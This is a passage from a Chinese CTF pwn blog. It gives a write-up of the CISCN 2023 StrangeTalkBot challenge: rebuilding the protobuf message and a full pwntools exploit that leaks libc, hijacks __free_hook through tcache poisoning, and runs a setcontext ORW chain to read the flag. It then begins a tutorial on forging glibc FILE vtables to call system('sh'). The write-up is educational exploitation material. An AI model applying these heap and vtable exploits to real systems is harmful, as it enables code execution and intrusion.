class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br><span class="hljs-number">0</span>PROTOBUF_C_TYPE_INT32,      <span class="hljs-comment">/**&lt; int32 */</span><br><span class="hljs-number">1</span>PROTOBUF_C_TYPE_SINT32,     <span class="hljs-comment">/**&lt; signed int32 */</span><br><span class="hljs-number">2</span>PROTOBUF_C_TYPE_SFIXED32,   <span class="hljs-comment">/**&lt; signed int32 (4 bytes) */</span><br><span class="hljs-number">3</span>PROTOBUF_C_TYPE_INT64,      <span class="hljs-comment">/**&lt; int64 */</span><br><span class="hljs-number">4</span>PROTOBUF_C_TYPE_SINT64,     <span class="hljs-comment">/**&lt; signed int64 */</span><br><span class="hljs-number">5</span>PROTOBUF_C_TYPE_SFIXED64,   <span class="hljs-comment">/**&lt; signed int64 (8 bytes) */</span><br><span class="hljs-number">6</span>PROTOBUF_C_TYPE_UINT32,     <span class="hljs-comment">/**&lt; unsigned int32 */</span><br><span class="hljs-number">7</span>PROTOBUF_C_TYPE_FIXED32,    <span class="hljs-comment">/**&lt; unsigned int32 (4 bytes) */</span><br><span class="hljs-number">8</span>PROTOBUF_C_TYPE_UINT64,     <span class="hljs-comment">/**&lt; unsigned int64 */</span><br><span class="hljs-number">9</span>PROTOBUF_C_TYPE_FIXED64,    <span class="hljs-comment">/**&lt; unsigned int64 (8 bytes) */</span><br><span class="hljs-number">0xa</span>PROTOBUF_C_TYPE_FLOAT,      <span class="hljs-comment">/**&lt; float */</span><br><span class="hljs-number">0xb</span>PROTOBUF_C_TYPE_DOUBLE,     <span class="hljs-comment">/**&lt; double */</span><br><span class="hljs-number">0xc</span>PROTOBUF_C_TYPE_BOOL,       <span class="hljs-comment">/**&lt; boolean */</span><br><span class="hljs-number">0xd</span>PROTOBUF_C_TYPE_ENUM,       <span class="hljs-comment">/**&lt; enumerated type */</span><br><span class="hljs-number">0xe</span>PROTOBUF_C_TYPE_STRING,     <span class="hljs-comment">/**&lt; UTF-8 or ASCII string */</span><br><span class="hljs-number">0xf</span>PROTOBUF_C_TYPE_BYTES,      <span class="hljs-comment">/**&lt; arbitrary byte sequence */</span><br><span class="hljs-number">0x10</span>PROTOBUF_C_TYPE_MESSAGE,    <span class="hljs-comment">/**&lt; nested message */</span><br>&#125; ProtobufCType;<br></code></pre></td></tr></table></figure><p>ProtobufCLabel 结构(label) 指定了字段的性质：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br><span class="hljs-comment">/** A well-formed message must have exactly one of this field. */</span><br>    <span class="hljs-comment">//格式正确的消息必须具有此字段</span><br>PROTOBUF_C_LABEL_REQUIRED,<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A well-formed message can have zero or one of this field (but not</span><br><span class="hljs-comment"> * more than one).</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//格式正确的消息可以有零个或一个此字段（但不能超过一个）</span><br>PROTOBUF_C_LABEL_OPTIONAL,<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * This field can be repeated any number of times (including zero) in a</span><br><span class="hljs-comment"> * well-formed message. The order of the repeated values will be</span><br><span class="hljs-comment"> * preserved.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//此字段可以在格式正确的消息中重复任意次数（包括零）。将保留重复值的顺序</span><br>PROTOBUF_C_LABEL_REPEATED,<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * This field has no label. This is valid only in proto3 and is</span><br><span class="hljs-comment"> * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//此字段没有标签。这仅在proto3中有效，等效于 OPTIONAL，但不查询&quot;has&quot;量词（proto3中没有has量词）。</span><br>PROTOBUF_C_LABEL_NONE,<br>&#125; ProtobufCLabel;<br></code></pre></td></tr></table></figure><p>后面题目中要用到的 ProtobufCBinaryData 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCBinaryData</span> &#123;</span><br><span class="hljs-type">size_t</span>len;        <span class="hljs-comment">/**&lt; Number of bytes in the `data` field. */</span><br><span class="hljs-type">uint8_t</span>*data;      <span class="hljs-comment">/**&lt; Data bytes. */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-初赛-StrangeTalkBot"><a href="#CISCN-2023-初赛-StrangeTalkBot" class="headerlink" title="[CISCN 2023 初赛]StrangeTalkBot"></a>[CISCN 2023 初赛]StrangeTalkBot</h2><p>这里可以直接看到ProtobufCMessageDescriptor结构体的信息，肯定是proto的题，函数的作用肯定就是反序列化了</p><p>直接便然魔数也是可以的</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101229164.png" alt="image-20241210122942062"></p><p>分析结构体进行还原</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101233016.png" alt="image-20241210123326927"></p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101234366.png" alt="image-20241210123410284"></p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101235061.png" alt="image-20241210123519961"></p><p>写出.proto源文件,确定版本方法，如果用了required就是2版本，3版本取消了required</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto2&quot;</span><span class="hljs-comment">;</span><br>package p0ach1l<span class="hljs-comment">;</span><br>message devicemsg &#123;<br>  required sint64 actionid <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  required sint64 msgidx <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>  required sint64 msgsize <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>  required bytes msgcontent <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>编译一下,打包成库</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">protoc <span class="hljs-params">--python_out=</span><span class="hljs-string">./</span> p0ach1l.proto<br></code></pre></td></tr></table></figure><p>libc版本是2.31_9.9的setcontext打ORW，参考以前博客</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> p0ach1l_pb2<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./bot&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28200&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    msg = p0ach1l_pb2.devicemsg()       <span class="hljs-comment"># 生成对象</span><br>    msg.actionid = <span class="hljs-number">1</span><br>    msg.msgidx = index<br>    msg.msgsize = size<br>    msg.msgcontent = content<br>    p.sendafter(<span class="hljs-string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>, msg.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    msg = p0ach1l_pb2.devicemsg()<br>    msg.actionid = <span class="hljs-number">2</span><br>    msg.msgidx = index<br>    msg.msgsize = <span class="hljs-built_in">len</span>(content)<br>    msg.msgcontent = content<br>    p.sendafter(<span class="hljs-string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>, msg.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    msg = p0ach1l_pb2.devicemsg()<br>    msg.actionid = <span class="hljs-number">3</span><br>    msg.msgidx = index<br>    msg.msgsize = <span class="hljs-number">7</span><br>    msg.msgcontent = <span class="hljs-string">b&#x27;useless&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>, msg.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    msg = p0ach1l_pb2.devicemsg()<br>    msg.actionid = <span class="hljs-number">4</span><br>    msg.msgidx = index<br>    msg.msgsize = <span class="hljs-number">7</span><br>    msg.msgcontent = <span class="hljs-string">b&#x27;useless&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;now: &#x27;</span>, msg.SerializeToString())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>) :<br>    add(i , <span class="hljs-number">0xf0</span> , <span class="hljs-string">b&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>) :<br>    free(i)<br><br>show(<span class="hljs-number">7</span>)<br>main_arean = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>libc_base = main_arean - <span class="hljs-number">0x1ecb80</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">8</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10</span><br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>magic_gadget = libc_base + <span class="hljs-number">0x0000000000151990</span><br><br>add(<span class="hljs-number">8</span> , <span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;&#x27;</span>)<br>add(<span class="hljs-number">9</span> , <span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;&#x27;</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">9</span> , p64(free_hook))<br>add(<span class="hljs-number">10</span> , <span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;&#x27;</span>)<br>add(<span class="hljs-number">11</span> , <span class="hljs-number">0x20</span> , p64(magic_gadget))<br><br><br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000023b6a</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x0000000000119211</span><br>pop_rax = libc_base + <span class="hljs-number">0x0000000000036174</span><br>syscall = read_addr + <span class="hljs-number">16</span><br>ret = libc_base + <span class="hljs-number">0x0000000000022679</span><br><br>rdx = heap_base + <span class="hljs-number">0xad0</span><br>orw = heap_base + <span class="hljs-number">0x980</span><br>flag = heap_base + <span class="hljs-number">0xad0</span><br>flag_addr = heap_base + <span class="hljs-number">0x100</span><br><br><span class="hljs-comment">#open</span><br>orwcode = p64(pop_rdi) + p64(flag)<br>orwcode += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>orwcode += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>orwcode += p64(syscall)<br><br><span class="hljs-comment">#read</span><br>orwcode += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>orwcode += p64(pop_rsi) + p64(flag_addr)<br>orwcode += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>orwcode += p64(read_addr)<br><br><span class="hljs-comment">#wride</span><br>orwcode += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>orwcode += p64(pop_rsi) + p64(flag_addr)<br>orwcode += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>orwcode += p64(write_addr) <br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(orwcode)))<br><br>payload = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + p64(rdx)<br>payload = payload.ljust(<span class="hljs-number">0x20</span>) + p64(setcontext)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(orw) + p64(ret)<br>add(<span class="hljs-number">12</span> , <span class="hljs-number">0xf0</span> , payload)<br>add(<span class="hljs-number">13</span> , <span class="hljs-number">0xf0</span> , orwcode)<br><br>pause()<br>free(<span class="hljs-number">12</span>)<br>lss(<span class="hljs-string">&quot;setcontext&quot;</span>)<br>lss(<span class="hljs-string">&quot;syscall&quot;</span>)<br>lss(<span class="hljs-string">&quot;magic_gadget&quot;</span>)<br>lss(<span class="hljs-string">&#x27;open_addr&#x27;</span>)<br>lss(<span class="hljs-string">&quot;read_addr&quot;</span>)<br>lss(<span class="hljs-string">&quot;write_addr&quot;</span>)<br>lss(<span class="hljs-string">&quot;free_hook&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;main_arean&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>protobuf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IO系类之伪造vtable</title>
    <link href="/2024/12/07/IO%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BC%AA%E9%80%A0vtable/"/>
    <url>/2024/12/07/IO%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BC%AA%E9%80%A0vtable/</url>
    
    <content type="html"><![CDATA[<h1 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>前面我们简绍了linux中文件流的特性和数据结构，尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p><p>因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p><p>因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    vtable_ptr[<span class="hljs-number">7</span>]=<span class="hljs-number">0x41414141</span> <span class="hljs-comment">//xsputn</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call 0x41414141&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据 vtable 在_IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后需要搞清楚欲劫持的 IO 函数会调用 vtable 中的哪个函数。关于 IO 函数调用 vtable 的情况已经在 FILE 结构介绍一节给出了，知道了 printf 会调用 vtable 中的 xsputn，并且 xsputn 的是 vtable 中第八项之后就可以写入这个指针进行劫持。</p><p>并且在 xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。比如这例子调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。</p><p>利用这点可以实现给劫持的 vtable 函数传參，比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_ptr;<br>    fp=<span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp<span class="hljs-number">+0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    <span class="hljs-built_in">memcopy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    vtable_ptr[<span class="hljs-number">7</span>]=system_ptr <span class="hljs-comment">//xsputn</span><br><br><br>    <span class="hljs-built_in">fwrite</span>(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_addr,*fake_vtable;<br><br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    fake_vtable=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br><br>    vtable_addr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//vtable offset</span><br><br>    vtable_addr[<span class="hljs-number">0</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fake_vtable;<br><br>    <span class="hljs-built_in">memcpy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    fake_vtable[<span class="hljs-number">7</span>]=system_ptr; <span class="hljs-comment">//xsputn</span><br><br>    fwrite(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “&#x2F;bin&#x2F;sh” 或 “sh”。</p><p>因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p><p>同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">print</span> &amp;_IO_2_1_stdin_<br><span class="hljs-variable">$2</span> = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;<br><br>0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/<br></code></pre></td></tr></table></figure><h2 id="例题——-CISCN-2022-华东北-duck"><a href="#例题——-CISCN-2022-华东北-duck" class="headerlink" title="例题——[CISCN 2022 华东北]duck"></a>例题——[CISCN 2022 华东北]duck</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/duck.rar">CISCN 2022 华东北duck</a></p><h3 id="方法一-——-修改-IO-file-jumps中的-IO-new-file-overflow"><a href="#方法一-——-修改-IO-file-jumps中的-IO-new-file-overflow" class="headerlink" title="方法一 —— 修改_IO_file_jumps中的_IO_new_file_overflow"></a>方法一 —— 